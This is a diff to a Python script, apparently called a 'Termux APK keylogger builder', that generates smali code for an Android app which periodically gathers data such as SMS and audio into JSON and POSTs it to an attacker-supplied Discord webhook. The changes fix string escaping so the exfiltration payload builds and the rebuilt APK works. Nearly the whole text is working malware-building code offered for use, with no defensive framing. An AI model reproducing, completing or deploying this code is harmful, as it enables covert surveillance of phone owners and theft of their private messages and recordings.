@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6 (FIXED)
-  Smali syntax FINAL FIX – 100% working
+  TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL FIX)
+  Smali syntax fixed – APK rebuild now works
   Developer: GT Security Team
 ============================================================
 """
@@ -77,11 +77,11 @@ def generate_keystore():
             "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
         ], check=False, capture_output=True)
 
-# ---------------------------- SMALI GENERATOR (FIXED) ----------------------------
+# ---------------------------- SMALI GENERATOR (COMPLETE FIX) ----------------------------
 def generate_smali(webhook, features, interval):
     """
-    Returns (outer_smali, inner_smali) – two separate smali files.
-    Fixes the "missing EOF at '.class'" error by splitting the inner class.
+    Returns (outer_smali, inner_smali) – both 100% valid smali syntax.
+    Fixes: escaped quotes in string literals, proper Thread.sleep().
     """
     webhook_escaped = webhook.replace('"', '\\"')
     sms = 'true' if features.get('sms', False) else 'false'
@@ -121,6 +121,7 @@ def generate_smali(webhook, features, interval):
 .end method
 '''
 
+    # Inner class smali – fixed string escaping and Thread.sleep()
     inner = f'''.class Lcom/gt/CustomLogger$1;
 .super Ljava/lang/Thread;
 .source "CustomLogger.java"
@@ -149,7 +150,6 @@ def generate_smali(webhook, features, interval):
 .method public run()V
     .registers 9
     :goto_0
-    # Sleep for interval seconds
     sget v0, Lcom/gt/CustomLogger;->INTERVAL:I
     int-to-long v0, v0
     const-wide/16 v2, 0x3e8
@@ -211,8 +211,22 @@ def generate_smali(webhook, features, interval):
     invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
     :cond_audio
 
-    # Send to Discord webhook
-    :try_send
+    # Build Discord payload: {"content": "<json_string>"}
+    new-instance v3, Ljava/lang/StringBuilder;
+    const-string v4, "{{\\"content\\": \\""
+    invoke-direct {{v3, v4}}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {{v2}}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
+    move-result-object v2
+    invoke-virtual {{v3, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v2, "\\"}}"
+    invoke-virtual {{v3, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
+
+    # Send HTTP POST
     new-instance v3, Ljava/net/URL;
     sget-object v4, Lcom/gt/CustomLogger;->WEBHOOK:Ljava/lang/String;
     invoke-direct {{v3, v4}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
@@ -229,17 +243,6 @@ def generate_smali(webhook, features, interval):
     invoke-virtual {{v3}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
     move-result-object v5
     invoke-direct {{v4, v5}}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
-
-    new-instance v5, Ljava/lang/StringBuilder;
-    const-string v6, "{{"content": "}}"
-    invoke-direct {{v5, v6}}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
-    invoke-virtual {{v2}}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
-    move-result-object v2
-    invoke-virtual {{v5, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    const-string v2, "}}"
-    invoke-virtual {{v5, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-    move-result-object v2
 
     const-string v5, "UTF-8"
     invoke-virtual {{v2, v5}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
